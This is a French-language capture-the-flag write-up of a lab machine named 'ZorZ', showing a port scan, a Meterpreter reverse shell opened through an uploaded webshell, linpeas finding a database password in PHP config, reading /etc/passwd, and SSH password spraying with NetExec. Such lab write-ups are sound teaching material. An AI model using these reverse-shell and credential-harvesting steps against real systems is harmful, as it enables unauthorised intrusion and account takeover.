# ZorZ

1.Énumération

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[m0rph3u53@parrot]─[~/Documents]
└──╼ $sudo sh massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] Scan IP: 192.168.56.165
[i] Rate: 1000
 
[+] Scan Masscan 192.168.56.165...100%
[+] Scan Nmap 192.168.56.165...100%
 
[+] 80/tcp open
[+] 22/tcp open
 
==========================================================
|                         Rapports                       |
==========================================================
| Nmap:/home/parrot/Massap/192.168.56.165-tcp.html       |
==========================================================
```

&nbsp;

Le serveur est un `uploader` de fichier

![Capture du 2025-03-16 17-27-58](https://github.com/user-attachments/assets/690207a6-602d-46b7-9ec6-c231491a6990)

&nbsp;

**<span style="color: #dddddd;">💥</span> Metasploit - webshell**

Connexion  la webshell

```
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 192.168.56.149:4444 
[*] Sending stage (40004 bytes) to 192.168.56.165
[*] Meterpreter session 1 opened (192.168.56.149:4444 -> 192.168.56.165:52845) at 2025-03-16 17:27:25 +0100

(Meterpreter 1)(/var/www/html/uploads3) >
```

&nbsp;

&nbsp;<span style="color: #dddddd;">🤖</span> **Linpeas**

Voyons si `linpeas` trouve des mots de passe

```
www-data@zorz:/tmp$ sh linpeas.sh

╔══════════╣ Searching passwords in config PHP files
$dbpass='toor2600root';
$dbuser='phpmyadmin';

```

&nbsp;

Énumération des utilisateurs

```
www-data@zorz:/tmp$cat /etc/passwd | grep 'bin/bash'
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000:user,,,:/home/user:/bin/bash
```

&nbsp;

**<span style="color: #dddddd;">🖥️</span> NetExec**

Test du mot de passe sur les 2 utilisateurs

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $nxc ssh 192.168.56.165 -u user.txt -p 'toor2600root' --sudo-check
SSH         192.168.56.165  22     192.168.56.165   [*] SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2
SSH         192.168.56.165  22     192.168.56.165   [-] root:toor2600root
SSH         192.168.56.165  22     192.168.56.165   [+] user:toor2600root (Pwn3d!) Linux - Shell access!

```

&nbsp;

Identifiant trouver

| Users | Password |
| --- | --- |
| user | toor2600root |

&nbsp;

&nbsp;

&nbsp;

&nbsp;
